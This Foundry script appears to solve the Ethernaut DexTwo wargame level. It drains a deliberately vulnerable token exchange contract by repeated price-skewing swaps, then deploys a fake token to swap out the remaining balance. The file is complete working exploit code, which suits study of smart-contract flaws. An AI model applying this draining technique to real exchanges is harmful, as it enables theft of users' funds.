// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { DexTwo, SwappableTokenTwo } from "../src/DexTwo.sol";


contract DexTwoSolver is Script {
	
	DexTwo public instance = DexTwo(0xF5a68BA2D6Ea9301065A6f3A8b03058cbc337C4A);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function min(uint256 a, uint256 b) public returns (uint256) {
        return a > b ? b : a;
    }

	function run () external {

		vm.startBroadcast(prv);

        address t1 = instance.token1();
        address t2 = instance.token2();
        SwappableTokenTwo t3Token = new SwappableTokenTwo(address(instance), "bad token", "B4D_TKN", 100);

        instance.approve(address(instance), 1000);

        console.log("||||||  logging  |||||||");
        console.logBytes32(bytes32(instance.balanceOf(t1, address(instance))));
        console.logBytes32(bytes32(instance.balanceOf(t2, address(instance))));
        console.logBytes32(bytes32(instance.balanceOf(t1, me)));
        console.logBytes32(bytes32(instance.balanceOf(t2, me)));

        uint256 b1 = instance.balanceOf(t1, address(instance));
        uint256 b2 = instance.balanceOf(t2, address(instance));

        for (uint256 i = 0; i < 50; i++) {

            address tmp = t1;
            t1 = t2;
            t2 = tmp;
            console.log("||||||  logging  |||||||");
            instance.swap(t1, t2, 
                min(
                    instance.balanceOf(t1, me),
                    instance.balanceOf(t1, address(instance))
                )
            );
            
            console.logBytes32(bytes32(instance.balanceOf(t1, address(instance))));
            console.logBytes32(bytes32(instance.balanceOf(t2, address(instance))));
            console.logBytes32(bytes32(instance.balanceOf(t1, me)));
            console.logBytes32(bytes32(instance.balanceOf(t2, me)));
            // console.logBytes32(bytes32(instance.getSwapPrice(t1, t2, 1)));
            // console.logBytes32(bytes32(instance.getSwapPrice(t2, t1, 1)));

            if (instance.balanceOf(t1, address(instance)) == 0)
                break;
            if (instance.balanceOf(t2, address(instance)) == 0)
                break;
        }

        address t3 = address(t3Token);

        console.log("draining the other token");


        t3Token.approve(address(instance), 1000);
        t3Token.transfer(address(instance), 10);
        instance.swap(t3, t1, 10);

        console.logBytes32(bytes32(instance.balanceOf(t1, address(instance))));
        console.logBytes32(bytes32(instance.balanceOf(t2, address(instance))));

		vm.stopBroadcast();


	}

}
